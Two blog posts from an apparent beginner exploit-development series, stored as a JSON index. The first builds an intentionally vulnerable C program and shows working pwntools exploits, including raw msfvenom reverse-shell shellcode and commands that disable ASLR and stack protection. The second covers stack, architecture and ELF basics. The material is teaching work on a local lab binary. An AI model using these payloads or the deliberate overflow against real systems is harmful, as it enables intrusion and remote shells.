[{"content":"In this post, we will see what is a buffer overflow and will exploit it to get code execution. Do Not feel overwhelmed. Just follow along and we\u0026rsquo;ll have fun.\nIf you are new to the series, check out my previous posts here\nThe Stack Take this C program:\n    program.c  #include \u0026lt;stdio.h\u0026gt;#include \u0026lt;unistd.h\u0026gt; int helper(){ system(\u0026#34;/bin/sh\u0026#34;); // executes system shell } int overflow(){ char buffer[500]; // declaring buffer variable with specified size  int userinput; userinput = read(0, buffer, 700); // reading user input into buffer variable  printf(\u0026#34;\\nUser provided %d bytes. Buffer content is: %s\\n\u0026#34;, userinput, buffer); return 0; } int main(int argc, char *argv[]){ overflow(); return 0; }    If we break down the program from the main function, it calls the overflow function which declares a variable of size 500 bytes and then, reads user input into that variable. Later, it prints the size of the provided input along with the input itself.\nAfter compiling, here\u0026rsquo;s what the program does:     Terminal    We have to compile the program with the following command:     Terminal  gcc -m32 -fno-stack-protector -z execstack program.c -o program    Also, we need to disable ASLR with the following command:     Terminal  echo 0 | sudo tee /proc/sys/kernel/randomize_va_space    Everytime you reboot your machine, you\u0026rsquo;ll have to do this step again.\nWhat's going on?  Modern programs come with a bunch of exploit mitigations. For example, we can see the protections on the ping binary which is mostly present on linux as well as windows, with checksec script.     Terminal      So, initially we\u0026rsquo;ll be working with those protections disabled and that is why we\u0026rsquo;re giving those extra flags to gcc.\nHere we can see the protections on our (compiled) program:     Terminal      For now, you don\u0026rsquo;t need to care about them. We\u0026rsquo;ll learn to bypass some anti-exploit mechanisms later on.\n \nIn general, the stack is aligned this way: Since our program is not dealing with any arguments, so, in our case, it\u0026rsquo;s like this: Stack Abuse What if we give the program some unexpected input? What if we give an input, more in magnitude than the defined buffer is supposed to handle? ðŸ¤”\nLet\u0026rsquo;s take a look.\nWhen we give an input bigger than a defined buffer, if the program is vulnerable, we overwrite other stuff that is already present on the stack.\nOur goal is to overwrite the return address of the function so that we can point the EIP to a memory address of our own choice. Normally, one can just get creative and give a program random inputs until something desirable is received back :)\nDeep Dive Let\u0026rsquo;s give our program some random inputs, with the help of Python.\n(You know we can pipe the output of one command to another, right?)\n    Terminal    Hnmm.. so, eventually, we broke the program!\nLet\u0026rsquo;s generate a pattern with cyclic utility and analyse the program with gdb to determine the offset of EIP.\nAlternative One can also use metasploit\u0026rsquo;s msf-pattern_create and msf-pattern_offset to achieve the same result.\n\n    Terminal    We get the offset to be 516.\nNow, we will send calculated input to see if we can control the EIP.\n    Terminal    And.. Yes! We can see 0x42424242, the hex code for the 4 B\u0026rsquo;s we sent.\nEIP Control When we have EIP under control, one of the first things we can do is to reuse the dead code present inside a binary.\nDead Code is a piece of code within a program which is not used when the program executes.\nCode Reuse We can see that the helper function isn\u0026rsquo;t called during the program execution. Since we have control over the EIP, we can point it to the helper function to get it executed.\nFor that purpose, we need the memory address of the helper function. We can find it with gdb as:\n    Terminal    Our binary is 32-bit and 32-bit programs use little-endian, due to which we have to provide the memory address in reverse bytes order.\n    Terminal    But.. we still get segmentation fault.\nNo need to worry. This is a common thing in exploit dev. Let\u0026rsquo;s arrange the bytes a bit and see what happens.\n    Terminal    Yay! Did you see? a new process /usr/bin/dash started.. Our Shell!\nBut, wait.. it also did exit even before we could interact with it.\nWhat happens under the hood is that a child process dash is started which operates by getting input from user (like bash or sh) but the parent process (our program) is done with its job and exits. The child process with no input, consequently, also exits.\nWe can take help of cat command to make the terminal wait for input.\nBut, for convenience, we are going to use an awesome tool, a python library, pwntools to make our exploitation process easy.\nPwntools\nHere\u0026rsquo;s a nice little exploit:\n    vim - exploit.py  1 2 3 4 5 6 7 8 9 10  #!/bin/python3 from pwn import * exe = \u0026#39;./program\u0026#39; payload=flat(\u0026#34;A\u0026#34;*516,0x565561b9) io = process(exe) io.sendline(payload) io.interactive()     Upon running the exploit, we successfully get a system shell and can execute arbitrary commands ðŸ”¥\n    Terminal    Shellcode The helper function made the exploitation very easy for us this time but, normally, we don\u0026rsquo;t have such a luxury very often. Then what are we supposed to do?\nWell, we can put machine/shell code on the stack and then point the EIP to it to achieve code execution.\nFor now, we are going to use msfvenom, an automated tool to generate the shellcode for us with this command:     Terminal  msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=1236 -b \u0026#34;\\x00\u0026#34; -f py        Terminal    We will use gdb and take note of the memory address from where our buffer starts.     Terminal    We\u0026rsquo;re giving dumb input (just A\u0026rsquo;s) so that we can easily see our buffer.     Terminal    We can see that our buffer is starting on the second line. Keep note of the memory address 0xffffcc18.\nExploitation Let\u0026rsquo;s prepare our exploit:     exploit.py  #!/bin/python3 from pwn import * exe = \u0026#39;./program\u0026#39; elf = context.binary = ELF(exe, checksec=False) buf = b\u0026#34;\u0026#34; buf += b\u0026#34;\\xbf\\x48\\x8a\\xd9\\x40\\xd9\\xec\\xd9\\x74\\x24\\xf4\\x5e\\x29\u0026#34; buf += b\u0026#34;\\xc9\\xb1\\x12\\x83\\xc6\\x04\\x31\\x7e\\x0e\\x03\\x36\\x84\\x3b\u0026#34; buf += b\u0026#34;\\xb5\\xf7\\x43\\x4c\\xd5\\xa4\\x30\\xe0\\x70\\x48\\x3e\\xe7\\x35\u0026#34; buf += b\u0026#34;\\x2a\\x8d\\x68\\xa6\\xeb\\xbd\\x56\\x04\\x8b\\xf7\\xd1\\x6f\\xe3\u0026#34; buf += b\u0026#34;\\x78\\x22\\x90\\xf2\\xee\\x20\\x90\\xf0\\x3a\\xad\\x71\\x48\\xa4\u0026#34; buf += b\u0026#34;\\xfe\\x20\\xfb\\x9a\\xfc\\x4b\\x1a\\x11\\x82\\x1e\\xb4\\xc4\\xac\u0026#34; buf += b\u0026#34;\\xed\\x2c\\x71\\x9c\\x3e\\xce\\xe8\\x6b\\xa3\\x5c\\xb8\\xe2\\xc5\u0026#34; buf += b\u0026#34;\\xd0\\x35\\x38\\x85\u0026#34; payload=flat(\u0026#34;\\x90\u0026#34;*16,buf,\u0026#34;A\u0026#34;*(500-len(buf)),0xffffcc18) write(\u0026#34;payload\u0026#34;,payload)    We have inserted a NOP slide (\\x90) in the payload before the shell code.\nA NOP instruction tells the CPU to do nothing (and just move to next instruction). Even if the stack alignment gets changed a bit, our NOP instructions won\u0026rsquo;t let our (noted) memory address go useless.\nLet\u0026rsquo;s run the exploit to get our payload.\nWe run the program with a breakpoint set and can see what\u0026rsquo;s there on the stack:     Terminal        Terminal    Let\u0026rsquo;s setup netcat listener in another terminal.     Terminal \u0026lt;2\u0026gt;    Now, let\u0026rsquo;s continue:     Terminal    Gdb is telling us that a new program is launched.\nOn switching to our second terminal, the one with listener.. we can see:     Terminal \u0026lt;2\u0026gt;    Vola! We got our reverse shell ðŸ”¥ ðŸ˜Ž\n","permalink":"https://the-root-user.github.io/blog/posts/pwn-0x01-buffer-overflow/","summary":"WTH is a buffer overflow? Let\u0026rsquo;s do it","title":"Pwn 0x01: Buffer Overflow"},{"content":"! We will not be diving deep into things but only as much as necessary. For further learning, I\u0026rsquo;ll link relevant resources.\n0.1 Prerequisites  Basic Computer Science knowledge Fundamental knowledge of C - here is a nice tutorial Curiosity - Consistency  Optional  Since, at first, we will be doing exploit development on Linux, it would be nice to learn the necessary things here. Some Assembly knowledge will benefit you a lot - here is a nice tutorial Gdb is going to play a key role in our exploit dev - here\u0026rsquo;s a lovely tutorial  0.2 Memory Structure High-level overview  More here  0.3 Architectures Comparison Here\u0026rsquo;s a C program:\n    program.c  #include \u0026lt;stdio.h\u0026gt; void print_user_data(char* arg1, char* arg2, char* arg3){ printf(\u0026#34;Here is Your data\\n\u0026#34;); printf(\u0026#34;Name: %s Age: %s Job: %s\\n\u0026#34;, arg1, arg2, arg3); } void main(int argc, char **argv){ if (argc!=4) { printf(\u0026#34;Please provide 3 inputs\\n\u0026#34;); } else { print_user_data(argv[1], argv[2], argv[3]); } }    The program takes some command line arguments from the user, checks if they are equivalent to 3 and then passes them to another function which prints some data on the console.\n After compiling the code with gcc as:     Terminal  gcc code.c -o code    or     Terminal  make code    make command is just another shortcut for us (for gcc)\n Here\u0026rsquo;s what it does:     Terminal    Simple enough, right?\nWhen we execute a binary, the binary name and the arguments to its function(s) are stored on the stack (in memory). They are accessed differently in different architectures.\nAfter seeing the disassembled binaries of both archs, you will notice that the length of memory addresses changes. But.. wait\n How are the command line arguments being parsed in memory?\n Let\u0026rsquo;s compile the code, disassemble it, and see what\u0026rsquo;s happening under the curtains.\nx32 Compile the code with the command: gcc -m32 code.c -o code\nWhy -m32? When we're on a 64-bit OS, the -m32 flag tells the compiler (gcc) to compile the code and give us a 32-bit binary. If you are on 32-bit machine, you can skip it.  Disassembly You can just follow along with the tutorial, but if you\u0026rsquo;re curious how I disassembled the binary, here you go.\nThere are many a ways/tools to disassemble a binary. Here, I have used gdb in the following way:     Terminal  gdb code # \u0026#39;code\u0026#39; is the name of our binary b main # instructing gdb to break at main function disassemble main # disassemble the main function    \n    Terminal    In the case of 32-bit binary, we can see that first, the arguments are being pushed onto the stack and then the call to our function print_user_data is made. They are later popped off the stack before the program exits.\nx64 Compile the code with the command: gcc code.c -o code\nDisassembly     Terminal    On the other hand, in the case of 64-bit binary, arguments are first moved into registers and then our function print_user_data is called.\nNow that you understand the distinction between the two, it will come in handy later on, as we will be putting 32-bit binaries to test more frequently for simplicity.\n0.4 ELF The last thing to be aware of are the ELF files. Wondering what they are?\nELF files, short for Executable and Linkable Format, are standard executables for Linux and other Unix OSs (not exactly but, think of them as the EXE files on Windows).\nAnd as for our current program, since we compiled it on Linux, it also is an ELF file.     Terminal    We might discuss ELF files in detail later on. For further study, here\u0026rsquo;s a nice video.\n","permalink":"https://the-root-user.github.io/blog/posts/pwn-0x00-warmup/","summary":"Let\u0026rsquo;s get ready to Pwn","title":"Pwn 0x00: Warmup"}]